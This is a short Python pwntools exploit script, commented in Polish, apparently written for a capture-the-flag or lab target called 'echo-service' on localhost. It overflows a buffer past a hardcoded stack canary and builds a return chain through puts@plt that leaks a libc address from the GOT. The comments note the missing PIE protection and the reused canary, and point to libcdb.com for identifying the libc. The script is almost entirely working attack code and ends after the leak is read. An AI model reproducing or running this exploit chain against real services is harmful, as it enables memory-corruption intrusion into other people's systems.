from pwn import *
#p = process('./echo-service', '9999')
p = connect('localhost',9998)
canary = '\x00\x864B'
def send(payload):
        payload = 'a' * 64 + canary + 12 * 'a' + payload
        p.sendline(payload)

putsplt = "0x08048640"
putsgot = "0x0804a034"
echo = "0x080487eb"


listeplt = 0x080486b0
listengot = 0x804a050

#wykorzystujemy to ze echo-server nie jest skompilowany PIE
payload = p32(0x08048640)#zawsze putsplt zeby wypisac zawartosc GOT w ktorej juz zaladowany zostal adres z biblioteki dzielonej
payload += p32(0x080487eb)#adres powrotu nieistotny bo serwer robi nowe procesy z tym samym kanarkiem
payload += p32(0x0804a034)#0x0804a034 to adres puts w sekcji got przesledzony dzieki posiadaniu binariow (istotnie korzystamy z braku PIE), potem pozemy wydrukowac adresy jak listen, __libc_start_main itd
#mozemy wtedy sprawdzic http://libcdb.com/ jaka to biblioteka  

p.recvline()
send(payload)
p.recvline()
p.send('\n')
puts = u32(p.read(4))




